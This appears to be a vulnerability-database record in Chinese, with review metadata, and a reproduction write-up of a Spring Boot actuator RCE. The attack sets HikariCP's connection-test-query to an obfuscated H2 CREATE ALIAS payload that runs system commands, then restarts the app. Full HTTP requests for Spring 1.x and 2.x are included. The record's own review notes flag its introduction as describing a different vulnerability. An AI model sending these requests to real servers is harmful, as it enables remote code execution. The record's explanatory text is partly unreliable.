---
source: "hatch 补库批 20260928"
product: "HikariCP/H2 SQL验证链"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot h2 database query rce"
prerequisites: "来源所述条件，未列明部分仍待核：H2版本未知，Boot1/2例需实际Hikari配置及Cloud env/restart支持"
side_effects: "未执行；本文需注意的操作影响：危险持久状态与修复欠缺；改DB验证SQL并重启，创建ALIAS可能重复报错导致连接不可用；只建议换名字未说明恢复/清理；组件与触发解释过度简化；restart不是BootActuator默认提供，自定义函数需CALL而不是未执行过自动运行"
source_status: "unknown"
id: "vw-299cc54755ebd8efef1f0053"
entity_id: "ve-299cc54755ebd8efef1f0053"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：H2版本未知，Boot1/2例需实际Hikari配置及Cloud env/restart支持

代码与实验材料：完整CREATE ALIAS T5+CALL与重启请求；提醒别名重复失败有价值，无响应证据

来源证据范围：历史导入无原出处

- **适用与权限边界（1）**：简介复制另一种漏洞；依据：开头h2-console/JNDI与实际connection-test-query CREATE ALIAS完全不同，console开放不是此链必要条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：危险持久状态与修复欠缺；依据：改DB验证SQL并重启，创建ALIAS可能重复报错导致连接不可用；只建议换名字未说明恢复/清理。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **操作与副作用边界（3）**：组件与触发解释过度简化；依据：restart不是BootActuator默认提供，自定义函数需CALL而不是未执行过自动运行。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot h2 database query rce

一、漏洞简介
------------

H2 database是一款Java内存数据库，多用于单元测试。H2
database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：

    spring.h2.console.enabled=true
    spring.h2.console.settings.web-allow-others=true

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/restart` 接口重启应用（存在
    spring-boot-starter-actuator 依赖）
-   存在 `com.h2database.h2` 依赖（版本要求暂未知）

二、漏洞影响
------------

三、复现过程
------------

### 漏洞原理

1.  spring.datasource.hikari.connection-test-query
    属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
2.  其属性对应 HikariCP 数据库连接池的 connectionTestQuery
    配置，定义一个新数据库连接之前被执行的 SQL 语句
3.  restart 重启应用，会建立新的数据库连接
4.  如果 SQL
    语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE
    漏洞

### 漏洞复现

##### 步骤一：设置 spring.datasource.hikari.connection-test-query 属性

> ⚠️ 下面payload 中的 \'T5\' 方法每一次执行命令后都需要更换名称 (如 T6)
> ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发

spring 1.x（无回显执行命令）

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');

spring 2.x（无回显执行命令）

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}

##### 步骤二：重启应用

spring 1.x

    POST /restart
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/restart
    Content-Type: application/json
